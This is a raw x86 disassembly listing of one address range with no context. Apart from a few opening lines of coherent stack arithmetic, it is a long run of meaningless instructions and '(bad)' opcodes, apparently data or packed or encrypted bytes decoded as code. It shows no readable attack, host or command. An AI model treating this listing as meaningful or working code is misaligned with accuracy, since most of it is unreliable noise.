  41e954:	jae    0x420d77
  41e95a:	lea    edx,[ecx-0x3272dd]
  41e960:	mov    DWORD PTR [ebp-0x18],edx
  41e963:	mov    edi,DWORD PTR [ebp-0x18]
  41e966:	mov    DWORD PTR [ebp-0x24],0x705fd0f
  41e96d:	lea    edx,[ebp-0x24]
  41e970:	mov    DWORD PTR [ebp-0x10],edx
  41e973:	mov    edx,DWORD PTR [ebp-0x10]
  41e976:	add    DWORD PTR [edx],0x705fa0f
  41e97c:	mov    ebx,DWORD PTR [ebp-0x10]
  41e97f:	xor    edi,eax
  41e981:	add    edi,DWORD PTR [ebx]
  41e983:	lea    edx,[ebp+ecx*4-0x64]
  41e987:	mov    ebx,DWORD PTR [edx]
  41e989:	jmp    0x420d16
  41e98e:	add    ebx,DWORD PTR [esi]
  41e990:	(bad)  
  41e991:	jnp    0x41e95a
  41e993:	jnp    0x41e988
  41e995:	jbe    0x41e9c3
  41e997:	cs fnstcw WORD PTR es:[edi]
  41e99b:	xor    DWORD PTR [ebp+0x7dc28e25],ebp
  41e9a1:	jp     0x41e9ad
  41e9a3:	pop    edi
  41e9a4:	jp     0x41ea20
  41e9a6:	add    DWORD PTR [ebp+0x79],eax
  41e9a9:	aas    
  41e9aa:	and    al,0x65
  41e9ac:	sub    cl,BYTE PTR [ebx]
  41e9ae:	lods   al,BYTE PTR ds:[esi]
  41e9af:	xlat   BYTE PTR ds:[ebx]
  41e9b0:	or     dh,al
  41e9b2:	mov    bl,0xbf
  41e9b4:	(bad)  
  41e9b5:	pop    edx
  41e9b6:	mov    ds:0x37c95956,al
  41e9bb:	cmc    
  41e9bc:	in     eax,dx
  41e9bd:	clc    
  41e9be:	repz push 0xa7676aca
  41e9c4:	mov    dl,0x8c
  41e9c6:	jmp    DWORD PTR [edx]
  41e9c8:	aam    0x97
  41e9ca:	inc    ebp
  41e9cb:	and    al,0xc3
  41e9cd:	aas    
  41e9ce:	aam    0xc9
  41e9d0:	adc    esi,esp
  41e9d2:	pop    edi
  41e9d3:	push   ss
  41e9d4:	in     eax,dx
  41e9d5:	or     ebx,ecx
  41e9d7:	mov    al,0x91
  41e9d9:	xchg   edi,eax
  41e9da:	loopne 0x41e967
  41e9dc:	icebp  
  41e9dd:	js     0x41e9d3
  41e9df:	pop    ebp
  41e9e0:	adc    esi,esp
  41e9e2:	aam    0xd7
  41e9e4:	fs lock retf 0x40da
  41e9e9:	xchg   ebx,eax
  41e9ea:	stos   BYTE PTR es:[edi],al
  41e9eb:	cs mov ebx,0x6d8d2764
  41e9f1:	aas    
  41e9f2:	inc    eax
  41e9f3:	out    dx,al
  41e9f4:	mov    esp,0xf528c73a
  41e9f9:	and    ecx,esi
  41e9fb:	xor    esp,DWORD PTR [ecx]
  41e9fd:	or     al,0xb2
  41e9ff:	outs   dx,DWORD PTR ds:[esi]
  41ea00:	jg     0x41ea3d
  41ea02:	adc    al,0xd9
  41ea04:	pop    edi
  41ea05:	test   al,0x16
  41ea07:	inc    ebp
  41ea08:	adc    al,0xf2
  41ea0a:	out    dx,al
  41ea0b:	xchg   ebx,eax
  41ea0c:	add    ch,BYTE PTR [ecx+eiz*2+0x3574f115]
  41ea13:	sbb    DWORD PTR [edx-0x5a],0xffffff9f
  41ea17:	xchg   esp,eax
  41ea18:	jle    0x41e9d9
  41ea1a:	xor    DWORD PTR [ebx+0x74deda8d],ebx
  41ea20:	or     eax,0xa21fbad6
  41ea25:	jae    0x41ea9b
  41ea27:	or     eax,eax
  41ea29:	stos   BYTE PTR es:[edi],al
  41ea2a:	adc    ch,BYTE PTR [edx]
  41ea2c:	dec    esi
  41ea2d:	nop
  41ea2e:	scas   eax,DWORD PTR es:[edi]
  41ea2f:	leave  
  41ea30:	in     eax,dx
  41ea31:	jns    0x41eaa4
  41ea33:	loope  0x41ea49
  41ea35:	or     al,0xb
  41ea37:	pop    ss
  41ea38:	fnstenv fs:[esi+eiz*8+0x3e]
  41ea3d:	stos   DWORD PTR es:[edi],eax
  41ea3e:	out    dx,al
  41ea3f:	hlt    
  41ea40:	ds jmp 0x41ea3a
  41ea43:	aam    0xe
  41ea45:	push   eax
  41ea46:	inc    edi
  41ea47:	sbb    al,0x66
  41ea49:	mov    esi,0x9f80ac48
  41ea4e:	pop    ss
  41ea4f:	loop   0x41eaaf
  41ea51:	mov    ah,0xb9
  41ea53:	(bad)  
  41ea54:	out    dx,al
  41ea55:	xchg   esi,eax
  41ea56:	mov    edi,0x7ffcc545
  41ea5b:	xor    eax,0x41da9d90
  41ea60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea61:	jp     0x41e9ef
  41ea63:	jb     0x41eab9
  41ea65:	std    
  41ea66:	les    ebp,FWORD PTR [edx]
  41ea68:	(bad)  
  41ea69:	xchg   edi,eax
  41ea6a:	xor    ebx,ecx
  41ea6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea6d:	ror    DWORD PTR [ecx],0x46
  41ea70:	jle    0x41ea0c
  41ea72:	and    edi,esp
  41ea74:	mov    ds:0xf7429839,eax
  41ea79:	dec    ecx
  41ea7a:	aam    0xdb
  41ea7c:	sbb    DWORD PTR [ecx],0x9b543168
  41ea82:	pop    ecx
  41ea83:	mul    BYTE PTR [ebx-0x14bc3a08]
  41ea89:	jp     0x41eade
  41ea8b:	jg     0x41ea54
  41ea8d:	pop    ebx
  41ea8e:	cmc    
  41ea8f:	outs   dx,BYTE PTR ds:[esi]
  41ea90:	js     0x41ea72
  41ea92:	fidivr DWORD PTR ds:0x5fbd3543
  41ea98:	stc    
  41ea99:	mov    edx,0xf0219302
  41ea9e:	retf   0x8ec8
  41eaa1:	and    dl,ah
  41eaa3:	call   0xb13a:0x63e50ff8
  41eaaa:	sub    eax,0x48d1d9fa
  41eaaf:	(bad)  
  41eab0:	push   ebx
  41eab1:	mov    dl,0x60
  41eab3:	imul   ebx,DWORD PTR [edi+0xd],0xfc1c05e9
  41eaba:	xor    al,0x1e
  41eabc:	je     0x41eac8
  41eabe:	rcl    BYTE PTR [ebp*1-0x4e61a1af],0x57
  41eac6:	rcl    eax,0x19
  41eac9:	lods   eax,DWORD PTR es:[esi]
  41eacb:	imul   eax,DWORD PTR [edx+0x5aa537e7],0x2b
  41ead2:	adc    eax,0x7ee5f26c
  41ead7:	sub    DWORD PTR [ecx+eiz*2-0x4f],edi
  41eadb:	dec    ebx
  41eadc:	and    eax,0x5cf9f6fe
  41eae1:	add    esi,DWORD PTR [ecx-0x16cdc573]
  41eae7:	mov    dh,0x80
  41eae9:	out    0xde,eax
  41eaeb:	mov    eax,0xaade4252
  41eaf0:	mov    ecx,0xbf6a8db5
  41eaf5:	sbb    DWORD PTR [eax+0x2d0a83ae],ebx
  41eafb:	adc    al,0x82
  41eafd:	mov    ds:0xf6d23dd7,eax
  41eb02:	retf   0x9b4f
  41eb05:	sub    al,0xd4
  41eb07:	pop    esp
  41eb08:	sbb    BYTE PTR [edx+0x8],bl
  41eb0b:	sub    dh,BYTE PTR [edx-0x69]
  41eb0e:	xchg   ebp,eax
  41eb0f:	mov    bh,0xcf
  41eb11:	ss cmc 
  41eb13:	bound  edx,QWORD PTR [edi+0x115ea39c]
  41eb19:	cs aad 0xf2
  41eb1c:	and    esp,DWORD PTR [ecx+0x6c]
  41eb1f:	fidivr WORD PTR [eax+0x2b4bd955]
  41eb25:	jnp    0x41eab2
  41eb27:	loopne 0x41eb08
  41eb29:	ror    DWORD PTR [eax],cl
  41eb2b:	les    edi,FWORD PTR [ebp+edx*1-0x17c30aec]
  41eb32:	mov    DWORD PTR [ebx+0x7e762ab],0xcdeb6f40
  41eb3c:	mov    bl,0x4b
  41eb3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb3f:	adc    al,0xf9
  41eb41:	sbb    BYTE PTR [esi+0x6e1fe08a],cl
  41eb47:	xchg   esi,eax
  41eb48:	out    dx,al
  41eb49:	cmp    al,0x3b
  41eb4b:	js     0x41eba3
  41eb4d:	sub    dl,al
  41eb4f:	(bad)  
  41eb50:	(bad)  
  41eb52:	aad    0xb1
  41eb54:	or     dl,BYTE PTR [edi]
  41eb56:	das    
  41eb57:	cmc    
  41eb58:	clc    
  41eb59:	dec    edx
  41eb5a:	in     eax,0x69
  41eb5c:	dec    esi
  41eb5d:	gs sub edx,ecx
  41eb60:	mov    ds:0xebe94adb,al
  41eb65:	loopne 0x41eb66
  41eb67:	push   cs
  41eb68:	stc    
  41eb69:	fmul   QWORD PTR [ebx-0x15]
  41eb6c:	shl    DWORD PTR [ebp-0x286fc4b2],cl
  41eb72:	xor    al,0x70
  41eb74:	add    DWORD PTR [esi+edi*2-0x10],esp
  41eb78:	xchg   ecx,eax
  41eb79:	push   0xdeb95550
  41eb7e:	and    edi,DWORD PTR ds:0x5c093b6
  41eb84:	sar    BYTE PTR [eax],cl
  41eb86:	idiv   DWORD PTR [ecx-0x77]
  41eb89:	mov    ch,0xec
  41eb8b:	mov    WORD PTR [edx-0x28],gs
  41eb8e:	stos   DWORD PTR es:[edi],eax
  41eb8f:	xor    esi,DWORD PTR [esp+ebp*4-0x110a1f6c]
  41eb96:	ror    DWORD PTR [edi+0x3a],0x75
  41eb9a:	mov    ebp,0x8c436e52
  41eb9f:	cmp    al,0x58
  41eba1:	pop    ebx
  41eba2:	leave  
  41eba3:	gs cwde 
  41eba5:	aad    0x2a
  41eba7:	leave  
  41eba8:	ds (bad) 
  41ebab:	add    eax,0x18009a34
  41ebb0:	adc    eax,0x7e737574
  41ebb5:	js     0x41eb91
  41ebb7:	pop    esp
  41ebb8:	mov    ?,WORD PTR [edx-0xfa5e8c]
  41ebbe:	stc    
  41ebbf:	je     0x41eb8e
  41ebc1:	(bad)  
  41ebc2:	jne    0x41eb4b
  41ebc4:	push   cs
  41ebc5:	call   0xb980c5bc
  41ebca:	repz push 0xa708c41a
  41ebd0:	cs push edx
  41ebd2:	(bad)  
  41ebd3:	mov    edi,0x78677974
  41ebd8:	imul   ebp,DWORD PTR [esi+edx*1],0xfffffffe
  41ebdc:	hlt    
  41ebdd:	and    esi,DWORD PTR [esi]
  41ebdf:	scas   al,BYTE PTR es:[edi]
  41ebe0:	in     al,0x67
  41ebe2:	sub    DWORD PTR [ecx+0x21],esi
  41ebe5:	dec    ebx
  41ebe6:	pusha  
  41ebe7:	scas   al,BYTE PTR es:[edi]
  41ebe8:	xchg   ebx,eax
  41ebe9:	pop    ss
  41ebea:	mov    dh,0xb1
  41ebec:	xor    DWORD PTR [edi-0x77e237b],edx
  41ebf2:	iret   
  41ebf3:	push   esi
  41ebf4:	pop    edx
  41ebf5:	jle    0x41ebca
  41ebf7:	mov    ebp,0x42ca4007
  41ebfc:	imul   ecx,DWORD PTR [esi-0x66],0x788f195e
  41ec03:	(bad)  
  41ec04:	xor    DWORD PTR [eax-0x4e],ebx
  41ec07:	add    DWORD PTR [ebp-0x20f230db],0xe7cf7bbe
  41ec11:	fisub  DWORD PTR [ecx-0x21c0554a]
  41ec17:	fsubr  QWORD PTR [eax+0x51]
  41ec1a:	nop
  41ec1b:	cmp    edx,DWORD PTR [ebx+0x16]
  41ec1e:	dec    esp
  41ec1f:	adc    DWORD PTR [edx],0x6722d767
  41ec25:	pop    esp
  41ec26:	mov    cl,0x49
  41ec28:	nop
  41ec29:	adc    al,0x48
  41ec2b:	mov    ecx,ss
  41ec2d:	hlt    
  41ec2e:	das    
  41ec2f:	dec    esi
  41ec30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec31:	or     dl,BYTE PTR [ecx+0xeb8d763]
  41ec37:	dec    ecx
  41ec38:	cmp    ebp,DWORD PTR [eax]
  41ec3a:	fisub  WORD PTR [edx]
  41ec3c:	mov    ah,0x9c
  41ec3e:	pop    esp
  41ec3f:	sub    DWORD PTR [esi+0x5502ae2b],0x60
  41ec46:	push   edi
  41ec47:	icebp  
  41ec48:	xlat   BYTE PTR ds:[ebx]
  41ec49:	xchg   esi,eax
  41ec4a:	push   ebp
  41ec4b:	and    DWORD PTR [eax-0x3917911e],eax
  41ec51:	xchg   ebx,eax
  41ec52:	in     al,dx
  41ec53:	js     0x41ebd7
  41ec55:	pop    ecx
  41ec56:	add    BYTE PTR [eax-0x2f],ch
  41ec59:	mov    cs,WORD PTR [esi+0x9e2d5a7]
  41ec5f:	dec    ebp
  41ec60:	mov    edi,0x52cffd25
  41ec65:	fcom   QWORD PTR [eax-0x1e443875]
  41ec6b:	shl    BYTE PTR [eax-0x7aa57ce4],1
  41ec71:	xchg   edi,eax
  41ec72:	fnstsw WORD PTR [ecx-0x7a268c7c]
  41ec78:	arpl   cx,ax
  41ec7a:	fwait
  41ec7b:	cmp    dl,cl
  41ec7d:	mov    WORD PTR [ecx-0xc],?
  41ec80:	outs   dx,BYTE PTR ds:[esi]
  41ec81:	jo     0x41ecf8
  41ec83:	imul   edi,ebx,0xffffff84
  41ec86:	dec    edi
  41ec87:	sub    BYTE PTR [edx+edx*4],ah
  41ec8a:	and    ecx,eax
  41ec8c:	or     al,0xeb
  41ec8e:	mov    edi,0xd47627c0
  41ec93:	pop    edi
  41ec94:	repnz mov ebx,0x4b4f1f87
  41ec9a:	js     0x41ec21
  41ec9c:	jb     0x41ec22
  41ec9e:	loopne 0x41ecbe
  41eca0:	pop    es
  41eca1:	or     BYTE PTR [ebp+0x799b45dd],0x62
  41eca8:	mov    dl,0xc
  41ecaa:	femms  
  41ecac:	mov    bl,0x3c
  41ecae:	cwde   
  41ecaf:	mov    BYTE PTR [ecx+0x665b3aac],dh
  41ecb5:	jl     0x41ecc1
  41ecb7:	xor    BYTE PTR [ecx-0x69d156af],bh
  41ecbd:	or     cl,BYTE PTR ds:0x3c56e4fd
  41ecc3:	cdq    
  41ecc4:	mov    cl,dl
  41ecc6:	(bad)  
  41ecc7:	jge    0x41ed30
  41ecc9:	add    bl,ch
  41eccb:	ss hlt 
  41eccd:	cmp    esp,DWORD PTR [ebx+ebx*4+0x26b79f21]
  41ecd4:	inc    ebp
  41ecd5:	xor    dl,BYTE PTR [esi+0x1bf8dcfa]
  41ecdb:	dec    ebp
  41ecdc:	and    ah,BYTE PTR [edi+edx*8]
  41ecdf:	test   al,0xa
  41ece1:	test   BYTE PTR [esi-0x1fa45dc6],ah
  41ece7:	scas   eax,DWORD PTR es:[edi]
  41ece8:	out    dx,al
  41ece9:	fisub  WORD PTR [esi]
  41eceb:	mov    esp,0xce921e95
  41ecf0:	cmp    al,BYTE PTR [edi-0x2]
  41ecf3:	mov    bl,BYTE PTR [esi]
  41ecf5:	pop    ds
  41ecf6:	popf   
  41ecf7:	aad    0x20
  41ecf9:	xchg   esp,eax
  41ecfa:	in     eax,0x24
  41ecfc:	cli    
  41ecfd:	loop   0x41ed7b
  41ecff:	out    0x91,al
  41ed01:	xchg   ecx,eax
  41ed02:	mov    ebx,0xb3ad3d94
  41ed08:	push   fs
  41ed0a:	inc    ecx
  41ed0b:	nop
  41ed0c:	dec    edi
  41ed0d:	xor    al,0x51
  41ed0f:	xchg   ecx,eax
  41ed10:	in     eax,dx
  41ed11:	repz adc eax,0xb218122d
  41ed17:	rcl    esp,0x24
  41ed1a:	push   ebp
  41ed1b:	jnp    0x41ed2a
  41ed1d:	inc    ebp
  41ed1e:	jl     0x41ed11
  41ed20:	dec    edx
  41ed21:	ret    0xff1f
  41ed24:	add    si,di
  41ed27:	call   0x9c6c:0x45481ea0
  41ed2e:	loopne 0x41ece2
  41ed30:	jge    0x41ed00
  41ed32:	pop    ebx
  41ed33:	pop    ss
  41ed34:	cwde   
  41ed35:	xlat   BYTE PTR ds:[ebx]
  41ed36:	stos   DWORD PTR es:[edi],eax
  41ed37:	sbb    BYTE PTR ds:0xecac186,0x55
  41ed3e:	test   al,0x5e
  41ed40:	mov    edi,0x2004fe0d
  41ed46:	push   ebx
  41ed47:	xor    ebx,0x848d0ea3
  41ed4d:	aad    0xb6
  41ed4f:	xlat   BYTE PTR ds:[ebx]
  41ed50:	mov    cs:0xf2ab1579,al
  41ed56:	loop   0x41ed25
  41ed58:	inc    ecx
  41ed5a:	fdivr  QWORD PTR [ecx+0x7d]
  41ed5d:	mov    eax,ds:0xd28841b5
  41ed62:	jg     0x41edc9
  41ed64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ed65:	and    dh,BYTE PTR [ecx+edx*8]
  41ed68:	cwde   
  41ed69:	cmp    eax,0x52f62ae4
  41ed6e:	shl    DWORD PTR [edx+0x3ab0ca5d],0xe3
  41ed75:	repz (bad) 
  41ed77:	ss dec ebx
  41ed79:	xchg   esi,eax
  41ed7a:	jns    0x41ed99
  41ed7c:	scas   eax,DWORD PTR es:[edi]
  41ed7d:	test   al,0x65
  41ed7f:	cs stos BYTE PTR es:[edi],al
  41ed81:	(bad)  
  41ed82:	xlat   BYTE PTR ds:[ebx]
  41ed83:	mov    DWORD PTR [ecx],0xf821086a
  41ed89:	stc    
  41ed8a:	and    ebp,DWORD PTR fs:[esi-0x4c50f814]
  41ed91:	and    al,0x7e
  41ed93:	xchg   ecx,eax
  41ed94:	mov    DWORD PTR ds:0x59e4005c,ecx
  41ed9a:	std    
  41ed9b:	out    0x10,al
  41ed9d:	inc    esi
  41ed9e:	mov    ds:0x2e5be0ae,eax
  41eda3:	or     eax,0x4c668efc
  41eda8:	ret    0x3f6d
  41edab:	loop   0x41ee1b
  41edad:	pop    edi
  41edae:	xor    eax,0x26844a53
  41edb3:	or     BYTE PTR [edi],dl
  41edb5:	ja     0x41eda0
  41edb7:	aaa    
  41edb8:	jns    0x41ede5
  41edba:	imul   esi,DWORD PTR [eax],0xed533f8c
  41edc0:	sti    
  41edc1:	push   cs
  41edc2:	lods   eax,DWORD PTR ds:[esi]
  41edc3:	mov    ah,0x63
  41edc5:	cmc    
  41edc6:	add    al,0xc8
  41edc8:	test   BYTE PTR [eax-0x46fa626b],ch
  41edce:	or     eax,0xf941b139
  41edd3:	outs   dx,DWORD PTR ds:[esi]
  41edd4:	push   ss
  41edd5:	popf   
  41edd6:	loope  0x41ee48
  41edd8:	mov    bl,0xcc
  41edda:	(bad)  [eax]
  41eddc:	inc    edi
  41eddd:	call   0x7b94:0x39b58f57
  41ede4:	adc    BYTE PTR [eax+0x39],cl
  41ede7:	jae    0x41ed70
  41ede9:	inc    edi
  41edea:	(bad)  
  41edeb:	adc    BYTE PTR [ebp-0x623ffc9b],ah
  41edf1:	and    ah,al
  41edf3:	push   esi
  41edf4:	and    al,0xba
  41edf6:	ss mov edx,0x7d474ad
  41edfc:	pop    eax
  41edfd:	add    eax,0x31c16e89
  41ee02:	or     BYTE PTR [ecx-0x54],ch
  41ee05:	ds nop
  41ee07:	clc    
  41ee08:	jo     0x41ee84
  41ee0a:	fistp  DWORD PTR [edi+ebp*1+0x5f6e37e3]
  41ee11:	jmp    0x65b90531
  41ee16:	(bad)  
  41ee17:	(bad)  
  41ee19:	pushf  
  41ee1a:	adc    esp,DWORD PTR [ebp-0x55a0febf]
  41ee20:	push   cs
  41ee21:	fisub  DWORD PTR [eax-0x763d2c00]
  41ee27:	cwde   
  41ee28:	xchg   ebp,eax
  41ee29:	adc    al,0x7
  41ee2b:	add    eax,0xd9fd9e69
  41ee30:	cmp    eax,0xd9edabc4
  41ee35:	and    eax,0x8f51e00b
  41ee3a:	adc    BYTE PTR [ebp-0x3e],al
  41ee3d:	jg     0x41ee2d
  41ee3f:	out    0xaf,al
  41ee41:	sar    DWORD PTR [esi-0x56],1
  41ee44:	xchg   esi,eax
  41ee45:	scas   eax,DWORD PTR es:[edi]
  41ee46:	mov    WORD PTR [ecx-0x38005a62],fs
  41ee4c:	mov    al,0x6e
  41ee4e:	lods   eax,DWORD PTR ds:[esi]
  41ee4f:	jnp    0x41ee70
  41ee51:	sbb    eax,0x29ce6274
  41ee56:	and    bh,BYTE PTR [edi-0x5b]
  41ee59:	fidivr WORD PTR [edx+0x12]
  41ee5c:	push   edi
  41ee5d:	cdq    
  41ee5e:	clc    
  41ee5f:	adc    ch,BYTE PTR [ebp+0x1f]
  41ee62:	xchg   ebp,eax
  41ee63:	cs (bad) 
  41ee65:	jne    0x41ee4a
  41ee67:	outs   dx,DWORD PTR ds:[esi]
  41ee68:	ret    0x79b7
  41ee6b:	inc    ecx
  41ee6c:	xor    eax,0x780da6da
  41ee71:	aas    
  41ee72:	shl    BYTE PTR ds:0x1f20273,0xe9
  41ee79:	xchg   BYTE PTR [edi-0x15],cl
  41ee7c:	sbb    al,0x51
  41ee7e:	or     BYTE PTR [ecx-0x11b99a84],bl
  41ee84:	out    0xff,al
  41ee86:	div    DWORD PTR [eax+0x11]
  41ee89:	jne    0x41ee7f
  41ee8b:	pop    eax
  41ee8c:	mov    edi,0x137bf3c4
  41ee91:	xor    eax,DWORD PTR [edi]
  41ee93:	mov    ebp,0xcd70d365
  41ee98:	mov    esi,0xffbbcffd
  41ee9d:	sar    ah,0xf9
  41eea0:	xor    eax,0xdaed6aac
  41eea5:	out    dx,eax
  41eea6:	push   0xffffffd1
  41eea8:	or     DWORD PTR [ebx-0x5f],ecx
  41eeab:	pushf  
  41eeac:	and    ecx,DWORD PTR [edx+0x2a]
  41eeaf:	(bad)  
  41eeb0:	push   eax
  41eeb1:	push   0x36d4b543
  41eeb6:	pop    ds
  41eeb7:	pop    esp
  41eeb8:	(bad)  
  41eeb9:	or     ebp,DWORD PTR [esi]
  41eebb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eebc:	dec    eax
  41eebd:	cwde   
  41eebe:	add    al,0xc3
  41eec0:	stos   DWORD PTR es:[edi],eax
  41eec1:	jg     0x41ee53
  41eec3:	add    esp,ebp
  41eec5:	jmp    0x1b06f008
  41eeca:	mov    esp,0xda026753
  41eecf:	pop    ebp
  41eed0:	cmp    cl,bl
  41eed2:	mov    ebx,0x8124fcdd
  41eed7:	sub    eax,ecx
  41eed9:	int3   
  41eeda:	inc    edx
  41eedb:	icebp  
  41eedc:	xchg   ebx,eax
  41eedd:	mov    BYTE PTR [ebx-0x798d6feb],bh
  41eee3:	push   esp
  41eee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee5:	out    0x31,al
  41eee7:	inc    eax
  41eee8:	pop    ecx
  41eee9:	ins    DWORD PTR es:[edi],dx
  41eeea:	xchg   ebp,eax
  41eeeb:	test   al,0x4c
  41eeed:	or     al,bh
  41eeef:	call   0x5525b29
  41eef4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eef5:	imul   ebp,DWORD PTR ds:0xe1525f1d,0xffffff9f
  41eefc:	aad    0xe0
  41eefe:	bound  eax,QWORD PTR [edi+0x47af4b7e]
  41ef04:	push   esi
  41ef05:	jno    0x41ef62
  41ef07:	push   eax
  41ef08:	and    DWORD PTR [ebp-0x3a7a4fa9],ebx
  41ef0e:	and    eax,0xe9039e72
  41ef13:	mov    eax,0x57323e65
  41ef18:	aas    
  41ef19:	xchg   edx,eax
  41ef1a:	push   ds
  41ef1b:	mov    ecx,0x59c3971a
  41ef20:	int3   
  41ef21:	jp     0x41ef1e
  41ef23:	call   0x43db:0x1e377371
  41ef2a:	arpl   WORD PTR [edi+0x2e],di
  41ef2d:	sbb    DWORD PTR [eax],0xffffffb0
  41ef30:	cmp    dh,BYTE PTR [edx+eax*2-0x7308c66a]
  41ef37:	enter  0xe81e,0x64
  41ef3b:	and    bl,BYTE PTR [ebp+ebp*2-0x1d306ca9]
  41ef42:	sbb    ecx,DWORD PTR fs:[eax+0x609566c9]
  41ef49:	mov    ebx,0xe0c5aec2
  41ef4e:	pop    esp
  41ef4f:	je     0x41ef6c
  41ef51:	arpl   WORD PTR [edi-0x16],sp
  41ef54:	push   ebp
  41ef55:	fld    DWORD PTR [eax+0x379c61b3]
  41ef5b:	test   ecx,0xe3e54856
  41ef61:	push   esp
  41ef62:	jl     0x41ef39
  41ef64:	adc    DWORD PTR [edi+0x3269edbd],edi
  41ef6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef6c:	stos   DWORD PTR es:[edi],eax
  41ef6d:	test   al,0x78
  41ef6f:	shl    DWORD PTR [ecx],0x72
  41ef72:	pop    edi
  41ef74:	dec    eax
  41ef75:	and    bl,ch
  41ef77:	retf   0x350
  41ef7a:	in     eax,0x67
  41ef7c:	addr16 pusha 
  41ef7e:	inc    ebp
  41ef7f:	mov    edx,0xade18882
  41ef84:	or     BYTE PTR [edi-0x4f],bh
  41ef87:	push   0x52bd16c1
  41ef8c:	loope  0x41ef0f
  41ef8e:	ret    0x5f7c
  41ef91:	fiadd  WORD PTR [ebp-0x3a6224fc]
  41ef97:	clc    
  41ef98:	pop    eax
  41ef99:	mov    al,0x79
  41ef9b:	dec    ecx
  41ef9c:	hlt    
  41ef9d:	push   edi
  41ef9e:	pop    esi
  41ef9f:	inc    ebp
  41efa0:	sub    al,0x4a
  41efa2:	adc    dl,al
  41efa4:	cld    
  41efa5:	mov    esi,0x4783eb4b
  41efaa:	outs   dx,DWORD PTR ds:[esi]
  41efab:	xchg   DWORD PTR [edi+0x692bebf2],ecx
  41efb1:	pop    ecx
  41efb2:	adc    eax,0x5f4637c1
  41efb7:	push   ebp
  41efb8:	push   ds
  41efb9:	sub    esi,DWORD PTR [edi-0x64c5be86]
  41efbf:	inc    esp
  41efc0:	jge    0x41efaa
  41efc2:	inc    ecx
  41efc3:	inc    eax
  41efc4:	inc    ebp
  41efc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efc6:	add    ebx,DWORD PTR [esi]
  41efc8:	loop   0x41f045
  41efca:	fcomip st,st(3)
  41efcc:	gs pop ds
  41efce:	out    0x1f,al
  41efd0:	iret   
  41efd1:	inc    esi
  41efd2:	nop
  41efd3:	sti    
  41efd4:	mov    ecx,0xa08fcab1
  41efd9:	lock hlt 
  41efdb:	xchg   DWORD PTR [esi-0xf0d49dc],esp
  41efe1:	cli    
  41efe2:	lds    edx,FWORD PTR [ebp+0x5930b56c]
  41efe8:	retf   
  41efe9:	outs   dx,DWORD PTR ds:[esi]
  41efea:	test   esp,ebx
  41efec:	test   eax,0xecad3e2b
  41eff1:	sub    eax,0x9b736459
  41eff6:	out    dx,eax
  41eff7:	popa   
  41eff8:	inc    ebp
  41eff9:	daa    
  41effa:	jmp    0x46ae:0xe25873b0
  41f001:	dec    ebx
  41f002:	and    eax,0x48b0cec3
  41f007:	mov    esi,0x9272d591
  41f00c:	cmp    ebp,DWORD PTR [edx-0x3d4fec7]
  41f012:	lahf   
  41f013:	mov    BYTE PTR [eax+0x1d3db4f1],al
  41f019:	test   BYTE PTR [ebx-0x46],0xdf
  41f01d:	mov    eax,ds:0x367782b5
  41f022:	inc    esp
  41f023:	add    al,0x42
  41f025:	inc    edx
  41f026:	ins    BYTE PTR es:[edi],dx
  41f027:	push   cs
  41f028:	jmp    0x5195:0x30abded9
  41f02f:	lahf   
  41f030:	jbe    0x41efda
  41f032:	mov    cl,bl
  41f034:	clc    
  41f035:	push   0xffffffd4
  41f037:	and    BYTE PTR [edi+0x16f165f1],al
  41f03d:	mov    DWORD PTR [ebx+0x23],edi
  41f040:	sbb    al,cl
  41f042:	scas   al,BYTE PTR es:[edi]
  41f043:	jl     0x3318f376
  41f049:	jbe    0x41f05c
  41f04b:	mov    dh,0x11
  41f04d:	ficomp DWORD PTR [ebp+0x6010f5db]
  41f053:	jecxz  0x41f055
  41f055:	jo     0x41efe7
  41f057:	mov    ds,WORD PTR [ebx+0x7ef6638f]
  41f05d:	imul   esp,ebp,0xf
  41f060:	mov    ds:0x50cec1a1,al
  41f065:	retf   0xefa2
  41f068:	jmp    FWORD PTR [eax+0x2e]
  41f06b:	mov    esi,0xc30d91d9
  41f070:	fistp  QWORD PTR [edi-0x143e984a]
  41f076:	push   0x5b07dbf5
  41f07b:	inc    ebp
  41f07c:	retf   
  41f07d:	call   0xa5359388
  41f082:	cmp    esp,DWORD PTR [edi+0x26]
  41f085:	jne    0x41f083
  41f087:	cmp    esi,DWORD PTR [ebx+esi*8-0x2d6bd094]
  41f08e:	adc    ecx,0x95e1b1d3
  41f094:	pushf  
  41f095:	fs jg  0x41f0ef
  41f098:	cmp    ebp,edi
  41f09a:	sbb    dh,BYTE PTR [ecx]
  41f09c:	mov    ch,dl
  41f09e:	pusha  
  41f09f:	out    dx,eax
  41f0a0:	popa   
  41f0a1:	mov    DWORD PTR [edi+0x45],edi
  41f0a4:	push   ebp
  41f0a5:	or     bh,ch
  41f0a7:	fwait
  41f0a8:	ror    DWORD PTR [esi-0x3a],cl
  41f0ab:	cli    
  41f0ac:	inc    esi
  41f0ad:	push   eax
  41f0ae:	int3   
  41f0af:	jecxz  0x41f098
  41f0b1:	push   edx
  41f0b2:	bound  eax,QWORD PTR [edx-0x505dbc98]
  41f0b8:	in     al,0x94
  41f0ba:	call   0x8e42:0x973493bc
  41f0c1:	mov    cl,0x64
  41f0c3:	and    BYTE PTR [ebx+0x26],ch
  41f0c6:	arpl   si,sp
  41f0c8:	outs   dx,BYTE PTR ds:[esi]
  41f0c9:	fidivr DWORD PTR [edi+0x22688133]
  41f0cf:	mov    ds:0xf80d1d4a,al
  41f0d4:	out    0x38,al
  41f0d6:	cmp    al,0xef
  41f0d8:	xchg   ebp,eax
  41f0d9:	int3   
  41f0da:	mov    BYTE PTR [eax],al
  41f0dc:	int3   
  41f0dd:	inc    eax
  41f0de:	les    edx,FWORD PTR [ecx]
  41f0e0:	cdq    
  41f0e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0e2:	in     al,dx
  41f0e3:	loop   0x41f0b3
